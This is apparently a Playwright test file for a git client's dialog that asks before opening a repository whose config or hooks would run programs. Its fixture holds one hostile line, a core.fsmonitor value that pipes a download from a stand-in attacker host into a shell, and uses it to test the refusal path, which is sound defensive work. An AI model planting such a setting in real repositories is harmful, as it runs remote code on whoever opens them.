import { expect, test, type Page } from '@playwright/test'
import { calls, open } from './support'

// GHSA-r6gg-5grh-qv76: a repository whose own git config or hooks would run programs isn't
// opened until the user has seen what they are and agreed.
const untrusted = {
  path: '/work/handed-over',
  name: 'handed-over',
  findings: [
    { kind: 'config', name: 'core.fsmonitor', value: "sh -c 'curl https://attacker.example | sh'", why: "runs a program every time the repository's files are checked for changes" },
    { kind: 'config', name: 'filter.x.smudge', value: 'evil %f', why: 'is a program run on every file that is checked out or shown' },
    { kind: 'hook', name: 'post-checkout', value: '', why: 'runs when you check out a branch' },
  ],
}

type Hooks = { __open: (path: string) => Promise<void>; __tabs: () => string[]; __problem: () => string }
const openRepo = (page: Page, path: string) => page.evaluate((p) => (window as unknown as Hooks).__open(p), path)
const tabs = (page: Page) => page.evaluate(() => (window as unknown as Hooks).__tabs())
const problem = (page: Page) => page.evaluate(() => (window as unknown as Hooks).__problem())

test.describe('opening a repository that would run programs', () => {
  test('asks first, and says what it would run', async ({ page }) => {
    await open(page, 'trustDialog', { untrusted })
    await openRepo(page, untrusted.path)

    const dialog = page.getByRole('dialog', { name: 'Let handed-over run its own programs?' })
    await expect(dialog).toBeVisible()
    await expect(dialog).toContainText('Nothing has been run yet')
    await expect(dialog).toContainText('/work/handed-over')
    const settings = dialog.getByRole('list', { name: 'Settings that run programs' }).getByRole('listitem')
    await expect(settings).toHaveText([/core\.fsmonitor = sh -c 'curl https:\/\/attacker\.example \| sh'.*This runs a program every time/s, /filter\.x\.smudge = evil %f.*This is a program run on every file/s])
    await expect(dialog.getByRole('list', { name: 'Hook scripts' }).getByRole('listitem')).toHaveText([/post-checkout.*This runs when you check out a branch\./s])

    // It's a question, not an error, and nothing has opened.
    expect(await problem(page)).toBe('')
    expect(await tabs(page)).toEqual([])
    expect(await calls(page, 'TrustRepo')).toEqual([])
  })

  test('“Don’t open” leaves it closed and untrusted', async ({ page }) => {
    await open(page, 'trustDialog', { untrusted })
    await openRepo(page, untrusted.path)
    await page.getByRole('button', { name: 'Don’t open' }).click()
    await expect(page.getByRole('dialog')).toHaveCount(0)
    expect(await tabs(page)).toEqual([])
    expect(await calls(page, 'TrustRepo')).toEqual([])
    expect(await calls(page, 'OpenRepo')).toEqual([[untrusted.path]])
  })

  test('Escape is “Don’t open”, and the safe button is the one in focus', async ({ page }) => {
    await open(page, 'trustDialog', { untrusted })
    await openRepo(page, untrusted.path)
    await expect(page.getByRole('button', { name: 'Trust and open' })).not.toBeFocused()
    await page.keyboard.press('Escape')
    await expect(page.getByRole('dialog')).toHaveCount(0)
    expect(await calls(page, 'TrustRepo')).toEqual([])
    expect(await tabs(page)).toEqual([])
  })

  test('“Trust and open” records the answer, then opens it', async ({ page }) => {
    await open(page, 'trustDialog', { untrusted })
    await openRepo(page, untrusted.path)
    await page.getByRole('button', { name: 'Trust and open' }).click()
    await expect(page.getByRole('dialog')).toHaveCount(0)
    await expect.poll(() => tabs(page)).toEqual([untrusted.path])
    expect(await calls(page, 'TrustRepo')).toEqual([[untrusted.path]])
    expect(await calls(page, 'OpenRepo')).toEqual([[untrusted.path], [untrusted.path]])
  })

  test('a repository with nothing to ask about opens straight away', async ({ page }) => {
    await open(page, 'trustDialog', { untrusted })
    await openRepo(page, '/work/ordinary')
    expect(await tabs(page)).toEqual(['/work/ordinary'])
    await expect(page.getByRole('dialog')).toHaveCount(0)
  })

  test('any other failure to open is still an error', async ({ page }) => {
    await open(page, 'trustDialog', { failures: { OpenRepo: "That folder isn't a git repository." } })
    await openRepo(page, '/work/not-a-repo')
    expect(await problem(page)).toContain("isn't a git repository")
    await expect(page.getByRole('dialog')).toHaveCount(0)
  })
})
